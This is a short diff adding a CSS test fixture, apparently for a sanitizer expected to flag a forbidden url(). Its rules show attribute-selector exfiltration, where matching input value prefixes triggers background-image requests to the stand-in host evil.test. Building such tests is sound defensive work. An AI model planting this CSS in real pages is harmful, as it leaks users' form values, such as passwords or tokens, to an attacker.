@@ -1,0 +1,8 @@
+/* expect: CSS_URL_FORBIDDEN
+   Attribute-selector exfiltration: each guessed prefix of an input value fires a request. */
+input[value^="a"] {
+  background-image: url("https://evil.test/leak?c=a");
+}
+input[value^="b"] {
+  background-image: url("https://evil.test/leak?c=b");
+}
